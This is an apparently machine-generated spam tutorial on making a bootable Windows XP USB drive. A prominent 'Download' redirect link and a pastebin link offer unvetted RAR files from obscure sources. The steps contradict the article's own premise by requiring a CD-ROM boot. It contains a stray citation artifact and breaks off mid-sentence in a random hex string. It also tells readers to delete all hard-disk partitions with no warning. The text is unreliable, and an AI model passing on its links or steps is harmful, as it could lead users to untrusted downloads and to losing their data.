# How to Create a Bootable USB Drive with Windows XP
 
If you want to install Windows XP on a computer that does not have a CD-ROM drive, or if you want to have a portable Windows XP system that you can use on any PC, you might be interested in creating a bootable USB drive with Windows XP. In this article, I will show you how to do that using some free tools and files that you can download from the internet.
 
Before we start, you will need the following things:
 
**Download ››››› [https://glycoltude.blogspot.com/?l=2uKNOS](https://glycoltude.blogspot.com/?l=2uKNOS)**


 
- A USB drive with at least 4 GB of free space.
- A computer that can boot from USB devices.
- A Windows XP installation CD or ISO file.
- The USBOOT.RAR and BOOTINI.RAR files, which contain the necessary files and instructions for making the USB drive bootable. You can download them from [this link](https://pastebin.com/8ktReD1u) [^2^].
- A program that can extract RAR files, such as WinRAR or 7-Zip.
- A program that can burn ISO files to CD or DVD, such as ImgBurn or CDBurnerXP.

Once you have everything ready, follow these steps:

1. Format your USB drive using the FAT32 file system. You can do this by right-clicking on the drive in My Computer and selecting Format. Make sure you select FAT32 as the file system and check the Quick Format option. Click Start and wait for the format to complete.
2. Extract the USBOOT.RAR file to a folder on your hard drive. You should see two folders: USBOOT and BOOTINI.
3. Copy the contents of the USBOOT folder to the root of your USB drive. You should see several files and folders, such as NTLDR, NTDETECT.COM, BOOT.INI, etc.
4. Extract the BOOTINI.RAR file to a folder on your hard drive. You should see a file called BOOT.INI.
5. Open the BOOT.INI file with Notepad or any text editor. You should see something like this:

        [boot loader]
        timeout=30
        default=multi(0)disk(0)rdisk(1)partition(1)\WINDOWS
        [operating systems]
        multi(0)disk(0)rdisk(1)partition(1)\WINDOWS="Microsoft Windows XP Professional" /noexecute=optin /fastdetect

6. Change the rdisk value from 1 to 0 in both lines. This tells the bootloader to look for the Windows XP installation files on the USB drive instead of the hard drive. The file should look like this:

        [boot loader]
        timeout=30
        default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
        [operating systems]
        multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /noexecute=optin /fastdetect

7. Save the file and copy it to the root of your USB drive, replacing the existing BOOT.INI file.
8. Burn the Windows XP installation CD or ISO file to a blank CD or DVD using your preferred program. Make sure you use the lowest possible speed and verify the disc after burning.
9. Insert the CD or DVD into your CD-ROM drive and restart your computer. Press F12 or any other key to access the boot menu and select your CD-ROM drive as the first boot device.
10. You should see a message saying "Press any key to boot from CD...". Press any key and wait for the Windows XP setup to load.
11. When you see the welcome screen, press Enter to start the installation. Accept the license agreement and press F8.
12. You should see a list of partitions on your hard drive. Press D to delete any existing partitions and press L to confirm. Then press C to create a new partition and enter the size you want. Press Enter to create it and press Enter 8cf37b1e13


